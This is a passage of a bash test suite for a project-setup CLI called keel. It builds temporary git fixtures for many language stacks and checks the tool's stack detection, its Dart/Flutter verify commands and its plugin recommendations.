#!/usr/bin/env bash
# Tests for bin/keel. Fixtures are generated per case rather than committed, so they cannot go
# stale against the code they exercise.
#
# Run from the repository root.

# The `condition && report_pass || report_fail` idiom is used throughout. It is safe here, and only
# here, because every reporting helper returns 0 explicitly: see the `return 0` on each below. That
# makes the invariant shellcheck cannot see a stated fact in the code rather than an assumption.
# shellcheck disable=SC2015
# shellcheck disable=SC2016
set -uo pipefail

ROOT="$(cd "$(dirname "$0")/.." && pwd)"
KEEL="$ROOT/bin/keel"
pass=0
fail=0

ok()   { printf '  PASS  %s\n' "$1"; pass=$((pass+1)); return 0; }
bad()  { printf '  FAIL  %s: %s\n' "$1" "$2"; fail=$((fail+1)); return 0; }

# Every stack is built once, committed once, and copied per case. The content and the commit are
# identical every time and no test asserts on commit identity, so the git work is shared as well as
# the files. fixture() hands out a copy and never the template, so nothing a case does can reach it.
FIXTURE_CACHE="$(mktemp -d)"

# A throwaway git repo of the given stack, printed as a path.
fixture() {
    local stack="$1"
    local tmpl="$FIXTURE_CACHE/$stack" dir
    [ -d "$tmpl" ] || fixture_build "$stack" "$tmpl"
    dir="$(mktemp -d)"
    cp -R "$tmpl/." "$dir/"
    printf '%s' "$dir"
}

# gates.coding_standards defaults to required (bin/keel#gates.coding_standards is a promise about a
# document), so a fixture that never runs coding-standards fails doctor on that alone. Cases that are
# not about coding_standards itself call this right after `init -y` so their own assertion is not
# confounded by a second, unrelated FAIL; the dedicated required/warn/off coverage lives in the
# "gates.coding_standards" case below and never calls this.
seed_standards() {   # seed_standards <fixture-dir>
    mkdir -p "$1/docs/keel"
    printf '# Standards\n\nSeeded for the test fixture.\n' > "$1/docs/keel/standards.md"
}

fixture_build() {   # fixture_build <stack> <dir>
    local stack="$1" dir="$2"
    mkdir -p "$dir"
    ( cd "$dir" || exit 1
      git init -q -b main .
      git config user.email t@t.t; git config user.name t
      case "$stack" in
        node-ts)
          cat > package.json <<'P'
{"name":"f","scripts":{"test":"jest","lint":"eslint .","build":"tsc","typecheck":"tsc --noEmit"},
 "devDependencies":{"typescript":"^5"}}
P
          echo '{}' > tsconfig.json ;;
        go)   printf 'module f\n\ngo 1.22\n' > go.mod ;;
        php)  echo '{"name":"f/f"}' > composer.json ;;
        python) printf '[project]\nname = "f"\n' > pyproject.toml ;;
        csharp)
          mkdir -p src/Api
          printf '<Project Sdk="Microsoft.NET.Sdk"><PropertyGroup><TargetFramework>net8.0</TargetFramework></PropertyGroup></Project>\n' \
            > src/Api/Api.csproj ;;
        ruby)
          printf "source 'https://rubygems.org'\ngem 'rails'\ngem 'rspec'\n" > Gemfile
          mkdir -p spec ;;
        kotlin)
          printf 'plugins { kotlin("jvm") version "2.0.0" }\n' > build.gradle.kts
          mkdir -p src/main/kotlin && printf 'fun main() {}\n' > src/main/kotlin/App.kt ;;
        swift)
          printf '// swift-tools-version:5.9\nimport PackageDescription\n' > Package.swift ;;
        cpp)
          printf 'cmake_minimum_required(VERSION 3.20)\nproject(f)\nenable_testing()\n' > CMakeLists.txt ;;
        lua)
          printf '{"runtime":{"version":"LuaJIT"}}\n' > .luarc.json
          printf 'return {}\n' > init.lua ;;
        polyglot)
          cat > package.json <<'P'
{"name":"f","scripts":{"test":"vitest run"},"devDependencies":{"typescript":"^5"}}
P
          echo '{}' > tsconfig.json
          printf '[project]\nname = "f"\n' > pyproject.toml ;;
        plsql)
          # Twelve .sql at the root and one package body below it, so .sql dominates and the
          # Oracle token sits in a subdirectory rather than the first file read.
          i=1; while [ "$i" -le 12 ]; do printf 'CREATE TABLE t%s (id NUMBER);\n' "$i" > "s$i.sql"; i=$((i+1)); done
          mkdir -p src
          printf 'CREATE OR REPLACE PACKAGE BODY pkg AS v VARCHAR2(30); END;\n' > src/pkg.sql
          printf '# notes\n' > README.md ;;
        plsql-small)
          # Nine .sql files in total, one short of the floor, and the ninth carries the Oracle token
          # so the fixture fails on the count alone rather than on two clauses at once.
          i=1; while [ "$i" -le 8 ]; do printf 'SELECT 1 FROM DUAL;\n' > "q$i.sql"; i=$((i+1)); done
          printf 'CREATE OR REPLACE PACKAGE BODY p AS v VARCHAR2(1); END;\n' > pkg.sql ;;
        ts-migrations)
          # The live false positive: .sql present, manifest present, .ts dominant.
          cat > package.json <<'P'
{"name":"f","scripts":{"test":"vitest run"},"devDependencies":{"typescript":"^5"}}
P
          echo '{}' > tsconfig.json
          i=1; while [ "$i" -le 20 ]; do printf 'CREATE TABLE t%s (id int);\n' "$i" > "m$i.sql"; i=$((i+1)); done
          i=1; while [ "$i" -le 40 ]; do printf 'export const x%s = 1\n' "$i" > "f$i.ts"; i=$((i+1)); done ;;
        plsql-nomarker)
          # PostgreSQL shaped: dominant .sql, no manifest, and PL/pgSQL syntax that must not count
          # as Oracle. Clauses 1 to 3 all hold here, so clause 4, the Oracle token, is the only one
          # that can reject it. The %ROWTYPE and %TYPE are the trap: PL/pgSQL has both, so a token
          # set that included them would call this tree Oracle.
          i=1; while [ "$i" -le 12 ]; do printf 'CREATE TABLE t%s (id integer);\n' "$i" > "m$i.sql"; i=$((i+1)); done
          mkdir -p sql
          printf 'DECLARE r mytable%%ROWTYPE; v mytable.col%%TYPE; BEGIN END;\n' > sql/fn.sql ;;
        plsql-pkg)
          # The idiomatic Oracle layout: package specs and bodies outnumber plain .sql. It must
          # still be detected, which is why sql_census leaves .pks, .pkb, .prc and .fnc out of the
          # denominator instead of letting them compete with .sql in the dominance test. Put them
          # back in and this tree censuses as "12 30" and is not Oracle.
          #
          # The Oracle token goes in the .sql files, not the .pkb ones: has_oracle_token scans
          # --include='*.sql' --include='*.plsql' only, so a token living in a .pkb is invisible to
          # it and this fixture would fail the token clause rather than exercising the denominator.
          i=1; while [ "$i" -le 30 ]; do printf 'PACKAGE p;\n' > "p$i.pks"; printf 'PACKAGE BODY p AS END;\n' > "p$i.pkb"; i=$((i+1)); done
          i=1; while [ "$i" -le 12 ]; do printf 'CREATE TABLE t%s (id VARCHAR2(9));\n' "$i" > "s$i.sql"; i=$((i+1)); done ;;
        plsql-notdominant)
          # Twelve .sql against forty .md, with the Oracle token present, so the count clause and
          # the token clause both hold and dominance is the only clause that fails. It is the
          # fixture that pins the dominance comparison itself: with that comparison deleted from
          # is_plsql_tree, this tree is the one that starts being called Oracle.
          i=1; while [ "$i" -le 12 ]; do printf 'CREATE TABLE t%s (id NUMBER);\n' "$i" > "s$i.sql"; i=$((i+1)); done
          printf 'CREATE OR REPLACE PACKAGE BODY p AS v VARCHAR2(9); END;\n' > s1.sql
          i=1; while [ "$i" -le 40 ]; do printf '# doc %s\n' "$i" > "d$i.md"; i=$((i+1)); done ;;
        plsql-upper)
          # SQL Developer and exp emit uppercase names. The census counts these and the token scan
          # must see them too, or the count and the evidence disagree.
          i=1; while [ "$i" -le 13 ]; do printf 'CREATE TABLE t%s (id NUMBER);\n' "$i" > "M$i.SQL"; i=$((i+1)); done
          printf 'CREATE OR REPLACE PACKAGE BODY p AS v VARCHAR2(9); END;\n' > M1.SQL ;;
        plsql-hidden)
          # A dotted name with a real extension is a .sql file. The census used to skip it while the
          # token scan read it, so detection could rest on a file the census denied existed.
          i=1; while [ "$i" -le 12 ]; do printf 'CREATE TABLE t%s (id integer);\n' "$i" > "m$i.sql"; i=$((i+1)); done
          printf 'v VARCHAR2(9);\n' > .oracle.sql ;;
        plsql-dotend)
          # A basename ending in a dot has no extension. It used to land in a shared empty bucket
          # and outvote .sql, which is the same defect the pks exclusion closed from the other side.
          i=1; while [ "$i" -le 12 ]; do printf 'v VARCHAR2(9);\n' > "s$i.sql"; i=$((i+1)); done
          i=1; while [ "$i" -le 40 ]; do : > "f$i."; i=$((i+1)); done ;;
        dart-flutter)
          cat > pubspec.yaml <<'P'
name: f
environment:
  sdk: ">=3.0.0 <4.0.0"
dependencies:
  flutter:
    sdk: flutter
  sqflite: ^2.3.0
dev_dependencies:
  flutter_lints: ^3.0.0
P
          mkdir -p test android ios lib
          printf "void main() {}\n" > test/widget_test.dart ;;
        dart-pure)
          # No Flutter SDK dependency, so the commands must use the `dart` spelling. FR-07.
          # flutter_lints is deliberately absent here: it is the dev dependency that would make a
          # bare-word `flutter` match call this package a Flutter application. One assertion appends
          # it to a copy of this fixture to hold that line.
          cat > pubspec.yaml <<'P'
name: f
environment:
  sdk: ">=3.0.0 <4.0.0"
dev_dependencies:
  test: ^1.24.0
P
          mkdir -p test lib
          printf "void main() {}\n" > test/f_test.dart ;;
        dart-pure-notest)
          # A plain Dart package that never added package:test. `dart test` fails here with
          # "Could not find package `test`", measured 2026-08-29, so verify.test must be null and
          # the skill must ask. The analyzer still runs, so verify.lint is not null.
          cat > pubspec.yaml <<'P'
name: f
environment:
  sdk: ">=3.0.0 <4.0.0"
P
          mkdir -p lib ;;
        dart-orphan)
          # Dart source with no manifest at any level. The false positive the marker exists to
          # survive: a real directory of this shape was found on 2026-08-29.
          mkdir -p lib/screens
          i=1; while [ "$i" -le 10 ]; do printf 'void f%s() {}\n' "$i" > "lib/screens/s$i.dart"; i=$((i+1)); done ;;
        dart-polyglot)
          # Both manifests at one root. Nothing in current work has this shape, so this fixture is
          # the only thing that pins FR-19's ordering.
          cat > pubspec.yaml <<'P'
name: f
dependencies:
  flutter:
    sdk: flutter
P
          printf '{"name":"f","devDependencies":{"typescript":"^5"}}\n' > package.json
          echo '{}' > tsconfig.json ;;
        dart-polyglot-web)
          # The same two manifests, plus the browser UI the Node half really has. Separate from
          # dart-polyglot because that fixture pins the marker order and this one pins what the
          # plugin list does with it: dart wins the primary slot either way, and the web app still
          # needs a browser driver.
          cat > pubspec.yaml <<'P'
name: f
dependencies:
  flutter:
    sdk: flutter
P
          printf '{"name":"f","devDependencies":{"typescript":"^5"}}\n' > package.json
          echo '{}' > tsconfig.json
          echo 'module.exports = {}' > next.config.js
          mkdir -p public ;;
        dart-flutter-notests)
          # A Flutter package that has not written a test yet. `flutter test` is bundled and needs
          # no dev dependency, which is why it was ungated, but bundled is not the same as runnable:
          # measured 2026-08-30, it exits 1 with `Test directory "test" not found.`
          cat > pubspec.yaml <<'P'
name: f
environment:
  sdk: ">=3.0.0 <4.0.0"
dependencies:
  flutter:
    sdk: flutter
P
          mkdir -p lib ;;
        dart-flutter-nottests)
          # A test/ directory holding no test file. The SDK names the condition itself: "Test files
          # must be in that directory and end with the pattern "_test.dart"". Measured 2026-08-30,
          # this exits 1 too, which is why the gate cannot be `[ -d test ]`.
          cat > pubspec.yaml <<'P'
name: f
environment:
  sdk: ">=3.0.0 <4.0.0"
dependencies:
  flutter:
    sdk: flutter
P
          mkdir -p lib test
          printf 'int helper() => 1;\n' > test/helper.dart ;;
        dart-flutter-nested)
          # Tests one directory down, which is an ordinary Dart layout. The counter-case to the two
          # above: the gate must not be so shallow that it nulls a project that does have tests.
          cat > pubspec.yaml <<'P'
name: f
environment:
  sdk: ">=3.0.0 <4.0.0"
dependencies:
  flutter:
    sdk: flutter
P
          mkdir -p lib test/unit
          printf "void main() {}\n" > test/unit/widget_test.dart ;;
        dart-pure-notestfiles)
          # Declares package:test and never wrote a test. The plain branch fails the same way the
          # Flutter one does, rc=65: "No test files were passed and the default "test/" directory
          # doesn't exist." Measured 2026-08-30. The dependency gate alone does not catch it.
          cat > pubspec.yaml <<'P'
name: f
environment:
  sdk: ">=3.0.0 <4.0.0"
dev_dependencies:
  test: ^1.24.0
P
          mkdir -p lib ;;
        dart-melos)
          # A melos workspace root, which is the common Dart monorepo layout. It declares a script
          # named `test` and no dependency on package:test, so `dart test` fails here exactly as it
          # does in dart-pure-notest. Measured against the real SDK on 2026-08-30:
          # "Could not find package `test` or file `test:test`".
          cat > pubspec.yaml <<'P'
name: workspace
environment:
  sdk: ">=3.0.0 <4.0.0"
dev_dependencies:
  melos: ^3.0.0
melos:
  scripts:
    test: melos exec -- dart test
P
          mkdir -p packages ;;
        bare) : ;;
      esac
      git add -A >/dev/null 2>&1; git commit -qm init >/dev/null 2>&1 || true )
}

# The detect-stack functions write_profile itself calls, run inside a fixture without paying for a
# whole `keel init`. Used only where a case asserts on what detection returns; anything asserting on
# a file init writes, on its output, or on doctor keeps the real CLI call.
#
# have_python belongs to bin/keel, not to the library, and pkg_scripts_load returns empty-handed
# without it: every npm script would read as absent and every declared command as a guess. It is
# defined here the same way the pkg_scripts_load probe further down defines it.
detect_in() {   # detect_in <dir> <expression>
    ( cd "$1" && bash -c 'have_python() { command -v python3 >/dev/null 2>&1; }
                          . "$1"
                          eval "$2"' _ "$ROOT/lib/detect-stack.sh" "$2" 2>/dev/null )
}

# Profile fields by dotted path, one per line, rendered as python prints them: None for null, True
# for a boolean. Asking for several at once reads the file in one interpreter start rather than one
# per field.
prof_of() {   # prof_of <dir> <dotted path>...
    local d="$1"; shift
    python3 - "$d/.keel/profile.json" "$@" <<'PY' 2>/dev/null
import json, sys
j = json.load(open(sys.argv[1]))
for path in sys.argv[2:]:
    v = j
    for seg in path.split('.'):
        v = v[seg]
    print(v)
PY
}

# ---- detection -------------------------------------------------------------

for stack in node-ts go php python csharp ruby kotlin swift cpp lua; do
    d="$(fixture "$stack")"
    got="$(detect_in "$d" 'detect_stack | cut -d" " -f1')"
    case "$stack" in
      node-ts) want=typescript ;;
      go)      want=go ;;
      php)     want=php ;;
      python)  want=python ;;
      csharp)  want=csharp ;;
      ruby)    want=ruby ;;
      kotlin)  want=kotlin ;;
      swift)   want=swift ;;
      cpp)     want=cpp ;;
      lua)     want=lua ;;
    esac
    [ "$got" = "$want" ] && ok "detects $stack as $want" || bad "detects $stack" "got '$got', want '$want'"
    rm -rf "$d"
done

# ---- dart -----------------------------------------------------------------
# Dart is read from pubspec.yaml, which is a declaration, so it needs none of the inference PL/SQL
# does. The orphan case is the one that matters: ten .dart files and no manifest must detect as
# nothing, because a marker keyed on source files would have called it Dart.
#
# The first cases read detect_languages rather than detect_stack, deliberately: they test the marker
# and the chain position that puts dart first. The detect_stack cases below test the tuple
# lang_profile builds from it. Both levels are asserted because a correct marker with no
# lang_profile arm was a real intermediate state here, and it looked green at one level.
d="$(fixture dart-flutter)"
got="$(detect_in "$d" 'detect_languages | tr "\n" " "')"
[ "$got" = "dart " ] && ok "a Flutter project detects as dart, and only dart" \
  || bad "dart" "got '$got', want 'dart '"
rm -rf "$d"

d="$(fixture dart-pure)"
got="$(detect_in "$d" 'detect_languages | head -n 1')"
[ "$got" = "dart" ] && ok "a pure Dart package detects as dart" \
  || bad "dart" "got '$got', want dart"
rm -rf "$d"

# This case passes before the implementation as well, because a tree nothing detects already returns
# an empty language list. It is kept because it is the regression guard for the marker, not evidence
# that the marker works. Step 2 says so rather than counting it among the failures.
d="$(fixture dart-orphan)"
got="$(detect_in "$d" 'detect_languages | tr "\n" " "')"
case "$got" in
  *dart*) bad "dart" "orphan tree got '$got', want no dart" ;;
  *)      ok "Dart source with no pubspec.yaml detects as nothing" ;;
esac
rm -rf "$d"

# A directory of Dart source with no manifest detects as no language, asserted above, which drops
# project_kind through to its extension census. That alternation had no `dart`, so a tree of source
# was classified `docs` and doctor then stopped asking it for a test command. Not a regression:
# before PR #49 nothing detected Dart either. Found in the review of PR #49, 2026-08-30.
#
# The profile-exists guard is not ceremony. `prof_of` swallows every error and returns the empty
# string, so without it a crashed `keel init` gives got='' and this case fails for the wrong reason
# rather than saying so.
d="$(fixture dart-orphan)"
( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )
if [ ! -f "$d/.keel/profile.json" ]; then
    bad "project_kind" "dart-orphan wrote no .keel/profile.json; keel init failed"
else
    got="$(prof_of "$d" project.kind)"
    [ "$got" = "service" ] && ok "a manifest-less Dart tree is a service, not docs" \
      || bad "project_kind" "dart-orphan got project.kind '$got', want service"
fi
rm -rf "$d"

d="$(fixture dart-polyglot)"
got="$(detect_in "$d" 'detect_languages | head -n 1')"
[ "$got" = "dart" ] && ok "dart is primary when another manifest is also present" \
  || bad "dart" "polyglot got '$got', want dart"
got="$(detect_in "$d" 'detect_also | tr "\n" " "')"
[ "$got" = "typescript " ] && ok "the other language is kept in stack.also, and nothing else is" \
  || bad "dart" "also got '$got', want 'typescript '"
rm -rf "$d"

# The build rule in tests/validate-skills.sh extracts languages by matching this exact spelling.
# A rename inside detect_languages disables that rule silently rather than breaking it, which is
# why the spelling is pinned here rather than left to review. FR-03.
awk '/^detect_languages\(\)/{f=1} f&&/^}/{f=0} f' "$ROOT/lib/detect-stack.sh" \
  | grep -q 'out="$out dart"' \
  && ok "dart uses the accumulator spelling the tool-table rule extracts" \
  || bad "dart" "detect_languages does not contain out=\"\$out dart\""

d="$(fixture dart-flutter)"
got="$(detect_in "$d" 'detect_stack')"
[ "$got" = "dart dart flutter pub" ] && ok "a Flutter project's stack tuple" \
  || bad "dart" "got '$got', want 'dart dart flutter pub'"
rm -rf "$d"

d="$(fixture dart-pure)"
got="$(detect_in "$d" 'detect_stack')"
[ "$got" = "dart dart none pub" ] && ok "a pure Dart package's stack tuple" \
  || bad "dart" "got '$got', want 'dart dart none pub'"
rm -rf "$d"

# flutter_lints is a dev dependency in 7 of the 15 repositories this was measured against. A marker
# matching the bare word would call a plain package a Flutter application, so the marker is the
# `sdk: flutter` line and this case is what holds it there. It appends to $d, the copy handed out
# by fixture(), never to the template under $FIXTURE_CACHE.
d="$(fixture dart-pure)"
printf '  flutter_lints: ^3.0.0\n' >> "$d/pubspec.yaml"
got="$(detect_in "$d" 'detect_stack')"
[ "$got" = "dart dart none pub" ] && ok "flutter_lints alone does not make a package a Flutter application" \
  || bad "dart" "got '$got', want 'dart dart none pub'"
rm -rf "$d"

# The end to end claim, which no assertion above makes: the tuple has to survive write_profile to be
# worth anything. The PL/SQL work added exactly this after a run where the detector had classified a
# repository correctly and the profile still said `unknown`. S-03 scenario 3.
d="$(fixture dart-flutter)"
( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )
{ read -r p_lang; read -r p_rt; read -r p_fw; read -r p_pm; } <<EOF
$(prof_of "$d" stack.language stack.runtime stack.framework stack.package_manager)
EOF
[ "$p_lang $p_rt $p_fw $p_pm" = "dart dart flutter pub" ] \
  && ok "keel init writes the Dart stack into the profile" \
  || bad "dart" "profile got '$p_lang $p_rt $p_fw $p_pm', want 'dart dart flutter pub'"
rm -rf "$d"

# The SDK ships the runner, the analyzer and the formatter, so these are unconditional. lint is
# ungated by analysis_options.yaml on purpose: the analyzer runs against the SDK default set whether
# or not that file exists, and 8 of the 15 repositories measured on 2026-08-29 have no such file.
# Gating on it would null out the majority. FR-08, FR-09, FR-10.
d="$(fixture dart-flutter)"
v_test="$(detect_in "$d" 'detect_verify test')"
v_one="$(detect_in "$d" 'detect_verify test_one')"
v_lint="$(detect_in "$d" 'detect_verify lint')"
v_fmt="$(detect_in "$d" 'detect_verify format')"
v_fix="$(detect_in "$d" 'detect_verify format_fix')"
[ "$v_test" = "flutter test" ] && ok "a Flutter project's test command" \
  || bad "dart" "test got '$v_test', want 'flutter test'"
[ "$v_one" = "flutter test {path}" ] && ok "a Flutter project's single-test command" \
  || bad "dart" "test_one got '$v_one', want 'flutter test {path}'"
[ "$v_lint" = "flutter analyze" ] && ok "a Flutter project lints with no config file present" \
  || bad "dart" "lint got '$v_lint', want 'flutter analyze'"
[ "$v_fmt" = "dart format --output=none --set-exit-if-changed ." ] \
  && ok "a Dart format command is check-only" \
  || bad "dart" "format got '$v_fmt', want the check-only dart format"
[ "$v_fix" = "dart format ." ] && ok "a Dart format_fix command writes" \
  || bad "dart" "format_fix got '$v_fix', want 'dart format .'"

# FR-13 and FR-14. `flutter build` is not a command on its own: `flutter build --help` lists eight
# targets, so choosing one is the guess CON-02 forbids. Decided by Bernard, 2026-08-29. typecheck is
# null because the analyzer is already verify.lint.
for k in build typecheck e2e security test_integration; do
    got="$(detect_in "$d" "detect_verify $k")"
    [ -z "$got" ] && ok "a Dart project's verify.$k is null" \
      || bad "dart" "verify.$k got '$got', want empty"
done

# The stories assert on the written profile, not on the function, because that is what a skill
# reads. S-04 and S-05 scenario 1 in their own words.
( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )
{ read -r p_test; read -r p_lint; read -r p_build; } <<EOF
$(prof_of "$d" verify.test verify.lint verify.build)
EOF
[ "$p_test|$p_lint|$p_build" = "flutter test|flutter analyze|None" ] \
  && ok "keel init writes the Dart verify commands" \
  || bad "dart" "profile verify got '$p_test|$p_lint|$p_build'"
rm -rf "$d"

# The `dart` spelling, which is the half of FR-07 no repository in current work exercises.
d="$(fixture dart-pure)"
v_test="$(detect_in "$d" 'detect_verify test')"
v_one="$(detect_in "$d" 'detect_verify test_one')"
v_lint="$(detect_in "$d" 'detect_verify lint')"
v_fmt="$(detect_in "$d" 'detect_verify format')"
[ "$v_test" = "dart test" ] && ok "a pure Dart package's test command" \
  || bad "dart" "test got '$v_test', want 'dart test'"
[ "$v_one" = "dart test {path}" ] && ok "a pure Dart package's single-test command" \
  || bad "dart" "test_one got '$v_one', want 'dart test {path}'"
[ "$v_lint" = "dart analyze" ] && ok "a pure Dart package's lint command" \
  || bad "dart" "lint got '$v_lint', want 'dart analyze'"
# The formatter is the same command for both, because `flutter format` was removed from the SDK.
# Running it on 2026-08-29 gives "Could not find a command named format".
[ "$v_fmt" = "dart format --output=none --set-exit-if-changed ." ] \
  && ok "the formatter is the dart spelling for both kinds of project" \
  || bad "dart" "format got '$v_fmt'"
rm -rf "$d"

# The gate. `dart test` needs package:test declared and does not ship with it, measured 2026-08-29,
# so a plain package that never added it gets null and the skill asks. CON-02. The analyzer needs no
# dependency, so lint is still filled: this fixture separates the two.
d="$(fixture dart-pure-notest)"
v_test="$(detect_in "$d" 'detect_verify test')"
v_one="$(detect_in "$d" 'detect_verify test_one')"
v_lint="$(detect_in "$d" 'detect_verify lint')"
[ -z "$v_test" ] && ok "a plain package without package:test gets no test command" \
  || bad "dart" "test got '$v_test', want empty"
[ -z "$v_one" ] && ok "and no single-test command either" \
  || bad "dart" "test_one got '$v_one', want empty"
[ "$v_lint" = "dart analyze" ] && ok "but it still gets a lint command, which needs no dependency" \
  || bad "dart" "lint got '$v_lint', want 'dart analyze'"
rm -rf "$d"

# The same gate, against the shape that got through it. A `test:` key is not a dependency wherever
# it happens to sit: a melos workspace declares one under `melos:` -> `scripts:` and depends on no
# package:test, and an `executables:` entry named `test` does the same. Found in review 2026-08-30,
# and measured against the real SDK: `dart test` in this fixture prints "Could not find package
# `test`", which is the failure FR-08 was amended to prevent. lint is asserted alongside so a
# regression that nulls the whole Dart arm cannot pass this case.
d="$(fixture dart-melos)"
v_test="$(detect_in "$d" 'detect_verify test')"
v_one="$(detect_in "$d" 'detect_verify test_one')"
v_lint="$(detect_in "$d" 'detect_verify lint')"
[ -z "$v_test" ] && ok "a melos script named test is not a package:test dependency" \
  || bad "dart" "melos test got '$v_test', want empty"
[ -z "$v_one" ] && ok "and it gets no single-test command either" \
  || bad "dart" "melos test_one got '$v_one', want empty"
[ "$v_lint" = "dart analyze" ] && ok "and the melos root still lints" \
  || bad "dart" "melos lint got '$v_lint', want 'dart analyze'"
rm -rf "$d"

# The runner needs a test to run, and neither spelling checks for one itself. `flutter test` is
# bundled and `dart test` is gated on its package, but bundled and declared both stop short of
# runnable: measured against the real SDK on 2026-08-30, all four of these states exit non-zero, and
# `keel doctor` runs verify.test and counts a non-zero exit as a problem. The condition is the SDK's
# own: a test/ directory holding at least one file ending `_test.dart`. FR-08, amended 2026-08-30.
#
# lint is asserted in each case, because it needs no test file and must survive the gate. Without it
# a regression that nulled the entire Dart arm would read as four passes here.
for f in dart-flutter-notests dart-flutter-nottests dart-pure-notestfiles; do
    d="$(fixture "$f")"
    v_test="$(detect_in "$d" 'detect_verify test')"
    v_one="$(detect_in "$d" 'detect_verify test_one')"
    v_lint="$(detect_in "$d" 'detect_verify lint')"
    [ -z "$v_test" ] && ok "$f gets no test command, because there is no test to run" \
      || bad "dart" "$f test got '$v_test', want empty"
    [ -z "$v_one" ] && ok "$f gets no single-test command either" \
      || bad "dart" "$f test_one got '$v_one', want empty"
    [ -n "$v_lint" ] && ok "$f still lints, which needs no test file" \
      || bad "dart" "$f lint got '$v_lint', want a command"
    rm -rf "$d"
done

# The counter-case, and the one that stops the gate being written too shallow. A test one directory
# down is an ordinary layout, and `flutter test` runs it.
d="$(fixture dart-flutter-nested)"
v_test="$(detect_in "$d" 'detect_verify test')"
[ "$v_test" = "flutter test" ] && ok "a test file one directory down still fills verify.test" \
  || bad "dart" "nested test got '$v_test', want 'flutter test'"
rm -rf "$d"

# CON-03: there is no Dart language server in claude-plugins-official. Checked 2026-08-29 against
# the catalogue: twelve language server ids, the same twelve lang_lsp maps, none for Dart. An id
# that does not resolve fails in settings.json, which lang_lsp's own comment calls worse than
# suggesting nothing. FR-18.
#
# Both cases assert an absence, so both are guarded against passing on nothing: the first requires
# the fixture to have produced some plugin at all, the second requires the settings file to exist.
# Measured 2026-08-30: without the second guard, a `keel init` that never ran reported PASS.
d="$(fixture dart-flutter)"
got="$(detect_in "$d" 'detect_plugins | tr "\n" " "')"
case "$got" in
  "")     bad "dart" "detect_plugins produced nothing, so this case proves nothing" ;;
  *-lsp*) bad "dart" "a Dart project was recommended a language server: '$got'" ;;
  *)      ok "a Dart project is recommended no language server" ;;
esac

# S-09 scenario 2: what detect_plugins feeds. The settings file is what a user actually gets, and an
# unresolvable id fails there rather than in the function.
( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )
if [ ! -f "$d/.claude/settings.json" ]; then
    bad "dart" "keel init wrote no settings.json, so this case proves nothing"
elif grep -qi dart "$d/.claude/settings.json"; then
    bad "dart" "settings.json names a dart plugin"
else
    ok "keel init writes no dart language server into settings.json"
fi
rm -rf "$d"

# Task 6 made has_ui true for Flutter, and detect_plugins keys the frontend recommendations on that.
# playwright drives browsers and has no driver for an Android or iOS binary, so a Flutter project
# must not be recommended it. docs/04-plugin-strategy.md already scopes that plugin to "browser
# flows worth testing"; this is the code catching up with the rule, not a new rule.
d="$(fixture dart-flutter)"
got="$(detect_in "$d" 'detect_plugins | tr "\n" " "')"
case "$got" in
  "")           bad "dart" "detect_plugins produced nothing, so this case proves nothing" ;;
  *playwright*) bad "dart" "a Flutter project was recommended playwright: '$got'" ;;
  *)            ok "a Flutter project is not recommended a browser test tool" ;;
esac
case "$got" in
  *frontend-design*) ok "but it is still recommended frontend-design, because it has a UI" ;;
  *)                 bad "dart" "frontend-design was dropped too: '$got'" ;;
esac

# The defect was in the written artefacts, not the function, so pin it there too. The sibling case
# above does the same for the language server.
( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )
if [ ! -f "$d/.claude/settings.json" ]; then
    bad "dart" "keel init wrote no settings.json, so this case proves nothing"
elif grep -q playwright "$d/.claude/settings.json"; then
    bad "dart" "settings.json recommends playwright to a Flutter project"
else
    ok "keel init writes no playwright into a Flutter project's settings"
fi
rm -rf "$d"

# The other side of the same rule: a browser-rendered UI still gets playwright. apex is the case
# that most resembles Flutter and must keep it, because APEX pages really are browser-rendered.
# There is no apex fixture: the has_ui case below builds one the same way, from the plsql fixture
# plus the manifest that names an APEX version.
d="$(fixture plsql)"
printf '{"apex_version":"23.2"}\n' > "$d/manifest.json"
got="$(detect_in "$d" 'detect_plugins | tr "\n" " "')"
case "$got" in
  *playwright*) ok "a browser-rendered UI still gets playwright" ;;
  *)            bad "dart" "apex lost playwright: '$got'" ;;
esac
rm -rf "$d"

# The third side of it, and the one the suppression got wrong. `fw` is the *primary* framework, and
# dart is first in the marker chain, so a root carrying both manifests resolves to flutter and the
# Node half lost its browser driver. Measured 2026-08-30: this shape produced
# `typescript-lsp frontend-design` where the base produced that plus playwright. The suppression is
# about there being no browser to drive, so it has to yield to a repository that has one.
d="$(fixture dart-polyglot-web)"
got="$(detect_in "$d" 'detect_plugins | tr "\n" " "')"
case "$got" in
  "")           bad "dart" "detect_plugins produced nothing, so this case proves nothing" ;;
  *playwright*) ok "a Flutter root with a browser UI beside it keeps playwright" ;;
  *)            bad "dart" "polyglot web root lost playwright: '$got'" ;;
esac
rm -rf "$d"

# D1. frontend.md is browser-specific prose, about bundle supply chain, CDN caching, browser history
# and referrer headers, and its gate read has_ui alone, which PR #49 set true for Flutter. That is
# the same root cause PR #49 fixed for playwright, in the second of three callers that each ask a
# different question of one field. The condition is pinned here rather than left to review because
# it is one table cell in a reference file, which is exactly the kind of line an unrelated edit
# reformats away.
hd="$ROOT/skills/coding-standards/references/house-defaults.md"
row="$(grep -F '[frontend.md](frontend.md)' "$hd" | head -1)"
if [ -z "$row" ]; then
    bad "coding-standards" "no frontend.md row in house-defaults.md, so this case proves nothing"
elif printf '%s' "$row" | grep -q 'flutter'; then
    ok "the frontend.md gate excludes flutter, whose UI is not browser-rendered"
else
    bad "coding-standards" "the frontend.md gate still reads has_ui alone: $row"
fi

# FR-19's ordering is the one thing in the detection matrix a reader can get wrong in a way that
# costs them: the table's own polyglot row says the first signal listed wins, and dart-polyglot
# asserts dart beats package.json. Pinned here rather than left to review, because a table row is
# the kind of thing a later edit reorders without noticing what depends on it.
mtx="$ROOT/docs/03-install-and-distribution.md"
pub="$(grep -n '^| `pubspec.yaml`' "$mtx" | head -1 | cut -d: -f1)"
pkg="$(grep -n '^| `package.json` with' "$mtx" | head -1 | cut -d: -f1)"
if [ -z "$pub" ] || [ -z "$pkg" ]; then
    bad "docs" "the detection matrix has no pubspec.yaml or package.json row, so this case proves nothing"
elif [ "$pub" -lt "$pkg" ]; then
    ok "the detection matrix lists pubspec.yaml above package.json, as the chain orders them"
else
    bad "docs" "pubspec.yaml is listed at line $pub, below package.json at $pkg, but detect_languages puts dart first"
fi

# The same rule for the other pair the table gets wrong. detect_languages matches kotlin before
# java, and its own comment says why: "a Gradle build is the marker for both and Kotlin is the
